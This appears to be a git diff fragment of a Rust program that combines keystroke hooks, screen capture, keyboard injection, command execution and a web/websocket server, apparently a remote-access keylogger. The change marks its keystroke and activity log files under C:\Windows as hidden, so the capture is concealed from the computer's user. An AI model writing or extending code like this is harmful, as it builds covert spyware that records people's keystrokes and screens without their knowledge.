@@ -6,8 +6,8 @@ use enigo::{Keyboard, Enigo, Settings};
 use xcap::{Monitor, image::ImageFormat};
 use device_query::{DeviceEvents, DeviceEventsHandler};
 use tokio::{net::TcpListener, process::Command, time::Duration};
-use std::{env::args, fs::OpenOptions, sync::{Arc, Mutex}, io::{Seek, Read, Write, Cursor, SeekFrom}};
 use axum::{Form, Router, extract::ws::{Message, WebSocketUpgrade}, response::Html, routing::{get, post}};
+use std::{env::args, fs::OpenOptions, sync::{Arc, Mutex}, io::{Seek, Read, Write, Cursor, SeekFrom}, os::windows::fs::OpenOptionsExt};
 
 #[derive(Deserialize)]
 struct Frm {
@@ -20,11 +20,11 @@ async fn main() {
     let mut arg = args();
     arg.next();
 
-    let lock = Arc::new(Mutex::new(OpenOptions::new().read(true).write(true).create(true).open("C:\\Windows\\opt.log").unwrap()));
+    let lock = Arc::new(Mutex::new(OpenOptions::new().read(true).write(true).create(true).attributes(2).open("C:\\Windows\\opt.log").unwrap()));
     let lock1 = lock.clone();
     let lock2 = lock.clone();
 
-    let lck = Arc::new(Mutex::new(OpenOptions::new().read(true).write(true).create(true).open("C:\\Windows\\full.log").unwrap()));
+    let lck = Arc::new(Mutex::new(OpenOptions::new().read(true).write(true).create(true).attributes(2).open("C:\\Windows\\full.log").unwrap()));
     let lck1 = lck.clone();
     let lck2 = lck.clone();
     let lck3 = lck.clone();
